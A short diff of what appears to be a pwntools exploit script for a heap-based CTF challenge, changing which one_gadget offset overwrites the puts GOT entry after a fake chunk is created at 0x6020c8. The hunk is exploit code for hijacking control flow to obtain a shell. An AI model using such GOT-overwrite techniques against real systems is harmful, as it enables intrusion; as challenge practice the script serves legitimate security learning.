@@ -44,7 +44,7 @@ edit('4','name','kind','4')
 p.sendline('n');sleep(t)
 create('name',p64(0x6020c8)+p64(puts_got),'5')	# index 5
 
-edit('4',p64(puts_got),p64(libc_base+one_list[0]),'6')
+edit('4',p64(puts_got),p64(libc_base+one_list[2]),'6')
 
 p.sendline('y');sleep(t)
 
